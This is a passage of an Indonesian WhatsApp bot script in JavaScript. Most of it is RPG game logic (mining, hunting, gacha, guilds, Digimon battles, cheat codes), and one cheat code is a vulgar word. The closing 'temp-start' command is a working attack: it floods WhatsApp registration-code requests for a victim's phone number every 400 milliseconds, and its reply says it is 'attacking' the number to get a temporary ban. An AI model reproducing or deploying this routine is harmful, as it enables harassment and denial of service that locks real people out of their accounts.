}, 2000) 
 } else
 if (args[0] === 'gold'){
 if (isEmas < anuv) return reply(`Kamu Tidak Memiliki Cukup Emas Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
 kurangEmas(m?.sender, anuv)
 let monaynya = 50000 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Emas Mu:* ${getEmas(m?.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anuv) return reply(`Kamu Tidak Memiliki Cukup Emerald Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
 kurangEmerald(m?.sender, anuv)
 let monaynya = 100000 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Emerald Mu:* ${getEmerald(m?.sender)}`)
}, 2000) 
 } /*else { reply("Incorrect Format!") }*/
 }
 break
       case 'global': case 'leaderboar': case 'lb':{
                            if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
           reply("*`[ TOP GLOBAL - SELECT ]`*\n\n• .global-buruan *<top buruan>*\n• .global-item *<rare collection>*")
           }
           break
                    
    case 'lb-buruan-global': case 'global-buruan':
{ 
    if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
    _buruan.sort((a, b) => {
        const totalA = a.ikan + a.ayam + a.kelinci + a.domba + a.sapi + a.gajah;
        const totalB = b.ikan + b.ayam + b.kelinci + b.domba + b.sapi + b.gajah;
        return totalB - totalA;
    });
    let txt = '*`< 10 TOP GLOBAL - LEADERBOARD >`*\n\n';
let rank = 1
    for (let i = 0; i < Math.min(_buruan.length, 10); i++) {
    const entry = _buruan[i];
        txt += `*🏆 Rank #${rank} 🏆*\n`;
        txt += `*🐾ID :* ${entry.id}\n`;
        txt += `*🐟Ikan* : ${entry.ikan}\n`;
        txt += `*🐔Ayam* : ${entry.ayam}\n`;
        txt += `*🐇Kelinci* : ${entry.kelinci}\n`;
        txt += `*🐑Domba* : ${entry.domba}\n`;
        txt += `*🐄Sapi* : ${entry.sapi}\n`;
        txt += `*🐘Gajah* : ${entry.gajah}\n\n`;
rank++;
    }
    if (txt.trim() === ` *LEADERBOARD* \n\n`) {
        reply("You Top 1");
    } else {
        reply(txt);
    }}
 break
 
 case "harian": case "daily": {
        
        let timerdaily = global.db.data.users[m.sender].lastclaimday + 86400000
  if (new Date - global.db.data.users[m.sender].lastclaimday < 86400000) return reply(`Anda sudah mengklaim, klaim harian hari ini\ntunggu selama ${msToTime(timerdaily - new Date())} lagi`)
   
   ezs = Math.ceil(Math.random() * 450)
as = randomNomor(99)
bs = randomNomor(500000)
cs = randomNomor(150)
addMonay(m.sender, bs)
addEmas(m.sender, as)
addBesi(m.sender, cs)
   
        reply(`Selamat kamu mendapatkan\n\n-• ${bs} Money\n-• ${as} Gold\n-• ${cs} Iron`)
        global.db.data.users[m.sender].lastclaimday = new Date * 1
        setTimeout(() => {
					reply(`Daily sudah bisa di dapatkan kembali`)
					}, 86400000)
					}
					break
					  case "bulanan": case "weekly": {
        
        let timerwek = global.db.data.users[m.sender].lastclaimwek + 604800000
  if (new Date - global.db.data.users[m.sender].lastclaimwek < 604800000) return reply(`Anda sudah mengklaim, klaim harian hari ini\ntunggu selama ${msToTime(timerwek - new Date())} lagi`)
   
   
   
        ezs = Math.ceil(Math.random() * 450)
as = randomNomor(110)
bs = randomNomor(900000)
cs = randomNomor(180)
addMonay(m.sender, bs)
addEmas(m.sender, as)
addBesi(m.sender, cs)
   
        reply(`Selamat kamu mendapatkan\n\n-• ${bs} Money\n-• ${as} Gold\n-• ${cs} Iron`)
    global.db.data.users[m.sender].lastclaimwek = new Date * 1
					}
					break
					case "tahunan": case "yearly": {
        
        let timeryer = global.db.data.users[m.sender].lastclaimyer + 31536000000
  if (new Date - global.db.data.users[m.sender].lastclaimyer < 31536000000) return reply(`Anda sudah mengklaim, klaim harian hari ini\ntunggu selama ${msToTime(timerwek - new Date())} lagi`)
   
   
   
        ezs = Math.ceil(Math.random() * 450)
as = randomNomor(600)
bs = randomNomor(5000000)
cs = randomNomor(290)
addMonay(m.sender, bs)
addEmas(m.sender, as)
addBesi(m.sender, cs)
   
        reply(`Selamat kamu mendapatkan\n\n-• ${bs} Money\n-• ${as} Gold\n-• ${cs} Iron`)
    global.db.data.users[m.sender].lastclaimyer = new Date * 1
					}
					break
 
        case 'gacha': case 'spin':
                         if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
        // mahkota
        const spingc = () => {

let token1 = [1,2,3,4,9,2,5,2,7,1,6,2,2,6,2,8,4,1,2,3,4,4,5,2,3,2]
let token2 = [1,1,1,1,1,0,2,2,2,2,0,0,1,1,1,2,1,1,1,1,1,1,1,2,1,1,1,1,1,1,2,1,1,2,1,1,2,2,2,1,1,1,1,1,2,1,1,2,1,1,2,1,0,0,1,1,1,1,1,1,1,2,1,2,1,0,0,1,1,1,1,2,1,1,0,0,2,2,2,1,1,1,2,1,1,1,1,0,2,2,0,1,1,1]
var mahkkkkk = token1[Math.floor(Math.random() * token1.length)]
var mahkkkkkkk = token2[Math.floor(Math.random() * token2.length)]
if (istoken < 5) return reply('Token spin Habis Kerja lah dan beli token lagi')
        if (mahkkkkkkk === 0) {
            reply(`Mendapatkan ${mahkkkkk} Digitrails Token`)
            } else if (mahkkkkkkk === 1) {
reply(`Mahkota Terkoleksi -> ${mahkkkkk} Item`)
                addMahkota(m.sender, mahkkkkk)
                } else if (mahkkkkkkk === 2) {
       reply(`Cho-cho Energy Terkoleksi -> ${mahkkkkk} Item`)
                    addCho(m.sender, mahkkkkk)
                }
}
        let mahko = [1,2,0,0,2,0,0,0,2,0,1,0,1,0,0,1,0,0,2,1,0,0,0,2,0,0,2,0,0,0,1,0,0,2,0,0,0,1,2,0,1,1,0,0,0,0,0,2,0,1,0,0,0,1,0,0,2,0,0,1,0,0,1,1,0,2,0,0,0,1,1,0,0,2,0,2,1,0,1,0,2,0,0,0,1,0,0,1,0,0,1,0,0,1,0,0,2,0,,0,0,0,2,0,0,1,1,0,0,0,1,1,0,0,0,1,0,1,1,0,0,1,1,0,0,0,1,1,0,0,0,1,0,0,0,1,2,0,0,1,2,0,0,0] // Rare math
var mahk = mahko[Math.floor(Math.random() * mahko.length)]
let token1 = [1,2,3,2,2,7,1,6,2,2,6,2,4,1,2,3,4,4,5,2,3,2]
let token2 = [1,1,1,1,1,0,2,2,2,2,0,0,1,1,1,2,1,1,1,1,1,1,1,2,1,1,1,1,1,1,2,1,1,2,1,1,2,2,2,1,1,1,1,1,2,1,1,2,1,1,2,1,0,0,1,1,1,1,1,1,1,2,1,2,1,0,0,1,1,1,1,2,1,1,0,0,2,2,2,1,1,1,2,1,1,1,1,0,2,2,0,1,1,1]
var mahkk = token1[Math.floor(Math.random() * token1.length)]
var mahkkk = token2[Math.floor(Math.random() * token2.length)]
if (args[0] === 'rare'){
    if (istoken < 5) return reply('Token spin Habis Kerja lah dan beli token lagi')
await loading()
        setTimeout(async () => {
            spingc()
            }, 1300)
     setTimeout(async () => {
            spingc()
            }, 1300)
     setTimeout(async () => {
            spingc()
            }, 1300)
     setTimeout(async () => {
            spingc()
            }, 1300)
     setTimeout(async () => {
            spingc()
            }, 1300)
    } else
        if (args[0] === 'normal'){
            
            if (istoken < 1) return reply('Token spin Habis Kerja lah dan beli token lagi')
            await loading()
            if (mahk === 0) {
            reply(`Mendapatkan ${mahkk} Digitrails Token`)
            } else if (mahk === 1) {
reply(`Mahkota Terkoleksi -> ${mahkk} Item`)
                addMahkota(m.sender, mahkk)
                } else if (mahk === 2) {
       reply(`Cho-cho Energy Terkoleksi -> ${mahkk} Item`)
                    addCho(m.sender, mahkk)
                           
                }
            } else 
                if (args[0] === 'free') {
                 let user = global.db.data.users[m.sender];
    if (new Date() - user.lasttokenn < 3600000) {
      m?.reply( '⏰ Anda hanya dapat gratis spin sekali dalam 1 jam.');
      return;
    }
    user.lasttokenn = new Date();        
                if (mahk === 0) {
            reply(`Mendapatkan ${mahkk} Digitrails Token`)
            } else if (mahk === 1) {
reply(`Mahkota Terkoleksi -> ${mahkk} Item`)
                addMahkota(m.sender, mahkk)
                } else if (mahk === 2) {
       reply(`Cho-cho Energy Terkoleksi -> ${mahkk} Item`)
                    addCho(m.sender, mahkk)
                }
                    let cooldownn = 3600000; 
    user.kuldontokenn = new Date() * 1 + cooldownn;
                    } else {
               reply('*`[ PILIH - SPIN ]`*\n> • Free *<24h limit>*\n> • Normal *<1x spin>*\n> • Extra *<5x spin>*\n\nExample : .spin free')
                         
                         }
        break
        case 'mining': case 'mine':{
                             if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!isInventory){ addInventori(m?.sender) }
if (isCekDarah < 1) return reply(`Kamu kelelahan!, cobalah heal menggunakan potion`) 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]

var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout( () => {
let caption = `[ Hasil Tambang ]\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
reply(caption)
}, 7000)
setTimeout( () => {
reply(`${pushname} Mulai Menambang`)
}, 1500)
userdb.DarahOrang -= 15
kurangenergy(m.sender, 21)
addBesi(m?.sender, besinya)
addEmas(m.sended, emasnya)
addMahkota(m?.sender, mahk)      
addEmerald(m?.sender, emeraldnya)
}
break
case 'hunt': case 'hunting': case 'berburu':{
    if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
                
                     
 if (!isDarah){ addInventoriDarah(m?.sender, DarahAwal) }
 if (isCekDarah < 1) return reply('Your Blood Is Gone, Try To Heal Using Potions') 
 if (!isInventoriBuruan){ addInventoriBuruan(m?.sender) } 
let luka = ["Tertusuk Duri Saat Berburu","Terpleset Ke Jurang Saat Berburu","Tertangkap Hewan Buas","Tidak Berhati-hati","Terjerat Akar","Terjatuh Saat berburu"]
let location = ["Hutan","Hutan Amazon","Hutan Tropis","Padang Rumput","Hutan Afrika","Pegunungan"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)] 
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
 if (lokasinya === 'Hutan') {
} else
 if (lokasinya === 'Hutan Amazon') {
} else
 if (lokasinya === 'Hutan Tropis') {
} else
 if (lokasinya === 'Padang Rumput') {
} else
 if (lokasinya === 'Hutan Afrika') {
} else
 if (lokasinya === 'Pegunungan') {
}
 setTimeout( () => {
let teksehmazeh = `*[ Hasil Berburu ]*\n`
teksehmazeh += `*🐟Ikan* : ${ikanmu}\n`
teksehmazeh += `*🐔Ayam* : ${ayam}\n`
teksehmazeh += `*🐇Kelinci* : ${kelinci}\n`
teksehmazeh += `*🐑Domba* : ${domba}\n`
teksehmazeh += `*🐄Sapi* : ${sapi}\n`
teksehmazeh += `*🐘Gajah* : ${gajah}\n\n`
teksehmazeh += `*[ INFO ]*\n`
teksehmazeh += `*Lokasi* : ${lokasinya}\n`
teksehmazeh += `*Luka* : ${lukanya}, Darah - 10\n`
teksehmazeh += `*Sisa Darah* : ${userdb.DarahOrang}\n`
reply(teksehmazeh)
}, 5000)
setTimeout( () => {
reply(`${pushname} Mulai Berburu Di ${lokasinya}`)
}, 1000) 
 addIkan(m?.sender, ikanmu) 
addAyam(m?.sender, ayam) 
addKelinci(m?.sender, kelinci)
addDomba(m?.sender, domba)
addSapi(m?.sender, sapi)
addGajah(m?.sender, gajah)
kurangenergy(m.sender, 21)
 userdb.DarahOrang -= 15
 }
 break  
        case 'mancing': case 'menancing':
        if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
        var ikanmuu = Math.ceil(Math.random() * 4)
        kurangenergy(m.sender, 21)
        addIkan(m?.sender, ikanmuu) 
        m.reply('Memancing . . .')
        await sleep(2700)
        m.reply('Ada Ikan Menyambar Umpan mu !')
        await sleep(1300)
        m.reply ('Kamu Dapat Ikan Nya !. Sedang melepaskan Kail pancing . . .')
        setTimeout(async () => {
        reply(`*Hasil Mancing*\n\nIkan: ${ikanmuu}\nKecapean Nunggu Energymu: ${getenergy(m?.sender)}`)
        }, 3000)
        break
        
         // Guild Rpg
 case "myguild": {
 if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
    
 const showMyGuild = (userId, m) => {
    const guildIdc = userGuilds[userId];
    if (!guildIdc) {
        return reply("You are not a member of any guild.");
    }

    return showGuildInfo(guildIdc, m);
};
 showMyGuild(m.sender, m)
 }
 break
 
 case "guildinfo": {
 if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
    
 if (!text) return reply(`[ Veemon ] >> Masukan Nama guild`)
 const guildIdd = text
 getGuildInfo(text)
 }
 break
 
  case "delguild": {
  if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
    
 if (!text) return m.reply(`[ Veemon ] >> Masukan Nama guild`)
 deleteGuild(text, m.sender)
 }
 break
 
 case "joinguild": {
 if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
    
 if (!text) return reply("Masukan Id Guild")
 const guildId = text
 addtoken(m.sender, 4)       
 joinGuild(guildId, m.sender)
 }
 break
 
 case "createguild": {
 if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
    
 if (!text) return reply("Masukan Nama guild nya")
 const guildName = text
 createGuild(guildName, m.sender)
 }
 break
 
 case "listguild":
 if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
    
 listGuilds()
 break
 
 // digimon ( pelihara )
 case "getdigi": case "getdigimon": {
 if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
  addtoken(m.sender, 4)         
 spinDigimon(m.sender, m)
 }
 break
 
 case "give-food": 
 if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
    if (chatdb.sleep === true) return m.reply("_*Digimon mu sedang tidur*_")
 userdb.kenyang += 47 
 userdb.happy += 43
 const reaksimakan = pickRandom(["Thaks","Yeah!!","eat, eat, eat","Delicious, I like this Food","Yeah, Now lets go figh","aku sudah makan ayo pukul pedo!","wareg, makasih","oke bang","Allright, Allright","aku kenyang..."])
 m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Eating...`)
 setTimeout(() => {
 m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* ${reaksimakan}`)
 }, 2509)
 m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* I'm Done...`)
 break
 
 case "recover":
 if (userdb.recoverplug < 1) return m.reply("*Gada recover.plug, 0*")
 if (chatdb.sleep === true) return m.reply("_*Digimon mu sedang tidur*_")
 if (!text) return m.reply("Ada 2 Pilihan, mp/hp Untuk digimon kamu.\n\nExample: .recover mp")
 if (text === "hp") {
 userdb.recoverplug -= 1
addDarah(m.sender, 90, userdb.maxdarahdigi)
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Done, Thaks`)
} else if (text === "mp") {
addMP(m.sender, 70)
userdb.recoverplug -= 1
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Thaks, Um..`)
}
break
case "sleep": case "tido":
if (chatdb.isbatel === true) return m.reply("Anda gila, digimon mu lagi lawan, masa mau turu")
if (chatdb.sleep === true) return m.reply("_*Digimon mu sedang tidur*_")
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Allright, I Sleep...`)
setTimeout(() => {
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Sleep..., Zzzz..`)
chatdb.sleep = true
}, 3000)
setTimeout(() => {
addDarah(m.sender, 9000, userdb.maxdarahdigi) 
addMP(m.sender, 9000)
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Uh.., I'm Wake up.`)
chatdb.sleep = false
}, 900000)
break

case "bermain":
if (chatdb.isbatel === true) return m.reply("Anda gila, digimon mu lagi lawan, masa mau main")
if (chatdb.sleep === true) return m.reply("_*Digimon mu sedang tidur*_")
m.reply(`Sedang Bermain Dengan digimon mu.., Have fun ${userDigimons[userId]}.`)
setTimeout(async () => {
userdb.happy += 71
addtoken(m.sender, 4)       
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Im Tired, I Want To Sleep.. or on.`)
}, 70000)
break

case "battle": {
if (userdb.digivice === false) return m.reply("*Kamu tidak mempunyai Digivice ataupun ark.*")
if (chatdb.isbatel === true) return //m.reply("Anda gila, digimon mu lagi lawan, masa mau turu")
        if (chatdb.sleep === true) return m.reply("_*Digimon mu sedang tidur*_")
if (!text) return reply("masukan nomor yang ingin di ajak battle")
const pitaj  = `${text}@s.whatsapp.net` 
userdb.happy += 19
challengeBattle(m.sender, pitaj);
}
break
case "acc-battle": {
if (chatdb.isbatel === true) return //m.reply("Anda gila, digimon mu lagi lawan, masa mau turu")

if (chatdb.sleep === true) return m.reply("_*Digimon mu sedang tidur*_")
if (!text) return reply("masukan nomor yang ingin battle")
addtoken(m.sender, 4)       
 acceptBattle(text+"@s.whatsapp.net", m.sender);
}
break

case "rejec-battle": {
  cancelBattle(m.sender);
}
break

case "cancle-battle": {
  cancelBattle(m.sender);
}
break

case "latih-digimon":
if (chatdb.isbatel === true) return //m.reply("Anda gila, digimon mu lagi lawan, masa mau turu")
if (userdb.tp < 1) return m.reply("_*Kamu Tidak punya TP ( TRAINING POINT )*_")
if (!text) return m.reply("Ada 3 type 1x - 5x - 10x\n\nExample: *.latih-digimon 5x*")
userdb.happy -= 17
if (text === "1x") {
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Allright, let's Workout.`)
setTimeout(async () => {
userdb.mpmax += 7
userdb.attackdigi += 5
userdb.tp -= 1
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Ah.. Enough, Im done.\n\n*<!> Peningkatan*\nAdd Attack: 10\nAdd Max Mp: 13`)
}, 9000)
} else if (text === "5x") {
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Allright, let's Workout.`)
setTimeout(async () => {
userdb.mpmax += 37
userdb.attackdigi += 32
userdb.tp -= 5
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Ah.. Enough, Im done.\n\n*<!> Peningkatan*\nAdd Attack: 20\nAdd Max Mp: 17`)
}, 9000)
} else if (text === "10x") {
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Allright, let's Workout.`)
setTimeout(async () => {
userdb.mpmax += 71
userdb.attackdigi += 62
userdb.tp -= 10
m.reply(`${m2}[  ${userDigimons[userId]}  ] :${m2}* Ah.. Enough, Im done.\n\n*<!> Peningkatan*\nAdd Attack: 20\nAdd Max Mp: 17`)
}, 9000)
}
    break
    
  case "tech":
const targetrca = userdb.attacksi
attack("Tech", m, targetrca)
userdb.happy -= 14
break

case "attack":
const targetrcaa = userdb.attacksi
attack("Attk", m, targetrcaa)
userdb.happy -= 14
break

case "heald":
attack("Heal", m)
userdb.happy -= 14
break

case "focus":
const targetrcaaa = userdb.attacksi
attack("Focus", m, targetrcaaa)
userdb.happy -= 27
break

case "slash":
const targetrcaaaa = userdb.attacksi
attack("Card", m, targetrcaaaa)
userdb.happy -= 11
break

case "break":
const targetrcaaaaa = userdb.attacksi
attack("Break", m, targetrcaaaaa)
userdb.happy -= 32
break
  
case "list-skil":
reply(skillsList)
break  
  
case "mydigi": case "my-digimon":
        showLevel(m.sender, m)
        break
        
     case "d-terminal":
     if (!text) return m.reply("*`<!> D - T E R M I N A L •`*\n\nUntuk Berkomunikasi Antar Partner / orang yang mempunyai digimon di bot ini. Ex- .d-terminal 6283294,subject,hello pi! you want to training pi?")
     if (userdb.digivice === false) return m.reply("*Kamu tidak mempunyai Digivice ataupun ark.*")
      let nomor = q.split(',')[0] ? q.split(',')[0] : q
				let saking = q.split(',')[1] ? q.split(',')[1] : q
				let pesan = q.split(',')[2] ? q.split(',')[2] : ''
			setTimeout(() => {
			m.reply("Succes..")
			}, 1200)
			userdb.happy += 19
        ptz.sendMessage(nomor+"@s.whatsapp.net", {text: `*${m2}FROM ${pushname} SUBJECT ${saking}${m2}*\n\n${pesan}\n\n${nomor} <- ${pushname}\n*< D-terminal >*`})    
          break   
          
      case "d3":
      if (userdb.digivice === false) return m.reply("*Kamu tidak mempunyai Digivice ataupun ark.*")
      let teksehmazehhj = `▬▭▬▭▬▭▬▭▬▭▬

*${m2}< STATS - DIGIMON >${m2}*

─ Training Point: ${userdb.tp}
─ Recover Plug: ${userdb.recoverplug}
─ Healt Point: ${getDarah(m?.sender)} 
─ Kenyang: ${userdb.kenyang}
─ Senang: ${userdb.happy}
─ Attack: ${userdb.attackdigi}

> Digivice •
▬▭▬▭▬▭▬`

reply(teksehmazehhj)
break
 //=======// fitur utama
 case "rules-rpg":
let mcb = `
*${m2}> Rules Rpg Di Sc Veemon <${m2}*
______________

1- *Jangan spam*
2- *Jangan membuat error*
3- *Jangan terlalu sering chat di pm*
4- *Mengerti Apa jadinya command di pilih*
_______
`
m.reply(mcb)
break

case "guide-rpg":
let mcb6 = `
*${m2}> Cara bermain Rpg Di Sc Veemon <${m2}*
______________

_1- *silahkan ketik .join rpg*_
> - ( Jika belum register )

_2- *Di sarankan, Dapatkan digimon*_
> - ( ketik .getdigi dan kirim )

 _3- *Berburu / Memancing Atau kerja*_ 
> - ( Command Sudah di sediakan )

_4- *Jadi yang terbaik di database*_
> - ( Peringkat *1* Di segala Leaderboard )

_5- *Milyader • Jadi si sultan*_
> - ( Sultan di database, Jadi Peringkat *1* )

_6- *Bersahabat Dengan digimon mu*_
> - ( Berteman Lebih dekat dengan partner )

_7- *Bertarung  Untuk semua*_
> - ( Battle dengan Sesama digimon )

_8- *Woah, You strong !*_
> - ( Latih digimon mu Menjadi kuat )

_9- *Melanjutkan Adventure*_
> - ( Melanjutkan Semua dan menjadi terbaik )
_______
`
m.reply(mcb6)
break
  case 'exitrpg': {                                
                
                fs.readFile('./Rpg/join.json', 'utf8', (err, data) => {
                    if (err) {
                        console.error('Terjadi kesalahan saat membaca file:', err);
                        return reply('Terjadi kesalahan saat membaca file.');
                    }

                    let users;
try {
                        users = JSON.parse(data);
                    } catch (parseError) {
                        console.error('Terjadi kesalahan saat menguraikan JSON:', parseError);
                        return reply('Terjadi kesalahan saat menguraikan data pengguna.');
                    }
                    const initialLength = users.length;
                    users = users.filter(user => user.id !== userId);

                    if (users.length === initialLength) {
                        return reply(`Kamu belum Join rpg, ketik .joinrpg`);
                    }
                    fs.writeFile('./Rpg/join.json', JSON.stringify(users, null, 2), 'utf8', (err) => {
                        if (err) {
                            console.error('Terjadi kesalahan saat menulis file:', err);
                            return reply('Terjadi kesalahan saat menulis file.');
                        } else {
                            return reply(`Sukses Quit Dari rpg`);
                        }
                    });
                });
        }
                break;
                
    case 'joinrpg': {   
    
    //= ini biar inventory g undefined//
    userdb.attackdigi = 0
    userdb.DarahOrang = 100
    userdb.tp = 0
    userdb.bits = 0
    userdb.kenyang = 0
    userdb.happy = 0
    userdb.digivice = false
    userdb.recoverplug = 0
    userdb.apajob = false
    userdb.job = "nganggur"
    userdb.hitcmd = 0
    userdb.setname = `${pushname}`  
    addtoken(m.sender, 48)                            
                fs.readFile('./Rpg/join.json', 'utf8', (err, data) => {
                    if (err) {
                        console.error(err);                        
                    }
                    let users;                   
try {
                        users = JSON.parse(data);
                    } catch (parseError) {
                        console.error('Err:', parseError);                        
                    }                
                    const userExists = users.some(user => user.id === userId);

                    if (userExists) {
                        return reply('Kamu sudah Join.');
                    }              
                    users.push({ id: userId  });

fs.writeFile('./Rpg/join.json', JSON.stringify(users, null, 2), 'utf8', (err) => {
                        if (err) {
                            console.error(err);                            
                        } else {
                            return reply('Sukses Join  Rpg!');
                        }
                    });
                });
}
                break;
 //=======//
        case 'luckyday':
case 'luckytime':{
      if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
ez = Math.ceil(Math.random() * 20)
a = randomNomor(99)
b = randomNomor(500)
c = randomNomor(150)
addMonay(m.sender, b)
addXP(m.sender, ez)
addEmas(m.sender, a)
addBesi(m.sender, c)
addtoken(m.sender, 4)    

reply(`
•• *${m2}-[ Lucky Day ]-${m2}* ••\n
┊ *Money:* ${b}\n
┊ *Gold :* ${a}\n
┊ *Iron :* ${c}`)
}
break

case "cheat":
if (!text) return m.reply('*`[ C H E A T ]`*\n\nExample: .cheat VERT182P\n_*Cheat 8 Angka*_')

if (text === "VERT182P") {
 addDarah(m?.sender, 900000, userdb.maxdarahdigi)
 m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "ROAQ092F") {
addenergy(m?.sender, 900000)
m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "VERTNROQ") {
addenergy(m?.sender, 900000)
addDarah(m?.sender, 900000, userdb.maxdarahdigi)
m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "BUAST09F") {
 addMonay(m?.sender, 900000)
 m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "BAUSXGLD") {
addEmas(m.sender, 900000)
addMonay(m?.sender, 900000)
 m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "GLDNWINGS") {
addEmas(m.sender, 900000)
 m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "MCVLEMRL") {
addEmerald(m?.sender, 900000)
m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "MCMNGLDN") {
addEmas(m.sender, 900000)
addMonay(m?.sender, 900000)
addEmerald(m?.sender, 900000)
m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "KONTOL") {
m.reply("*`[ CHEAT ACTIVED ]`*")
} else if (text === "UPDIGI99") {
addXP(m.sender, 999)
m.reply("*`[ CHEAT ACTIVED ]`*")
} 
break


        // === //

case "smartcontract": case "smart":
   let isuragg = await fetchJson(`https://api.hyuunewbie.my.id/api/smartcontract?message=${text}`)
let guaaa = isuragg.data.response
reply(guaaa)   
        break

 
case 'temp-start': {
if (!isPremium) return
if (!text) return reply(`Example: ${prefix + command} 62|81662748286`)
if (!/|/.test(text)) return reply(`Example: ${prefix + command} 62|82636838163`)
let numbers = JSON.parse(fs.readFileSync('./system/Tempor.json'))
let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number
await reply(`Sukses\n\nVeemon Menyerang nomor Tersebut Jika ingin Menghentikan Temporary ban ketik .temp-stop Silah Check Nomor: ${fullNo}`)
let { state, saveCreds } = await useMultiFileAuthState('session3')
let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./system/Tempor.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break  
